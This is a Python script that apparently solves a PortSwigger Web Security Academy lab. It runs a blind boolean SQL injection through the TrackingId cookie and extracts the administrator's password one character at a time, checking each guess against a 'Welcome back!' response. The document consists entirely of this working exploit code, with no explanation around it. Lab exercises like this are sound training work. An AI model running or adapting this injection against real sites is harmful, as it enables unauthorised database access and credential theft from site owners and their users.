import requests, sys

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
session = requests.Session()
url = 'https://0a3300e7046789ec819e2510001600d2.web-security-academy.net'
check = "Welcome back!"

response = session.get(url)
session_cookies = session.cookies
tracking_id = session_cookies.get('TrackingId')

starting = 1
while True:
    for i in chars:
        tracking = session.cookies.get('TrackingId') + "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),"+str(starting)+",1) = '" + i
        cookies = {"session" : session.cookies.get('session'),
                   "TrackingId" : tracking }
        response = session.get(url, cookies=cookies)

        if check in response.text:
            sys.stdout.write(i)
            sys.stdout.flush()
            starting += 1
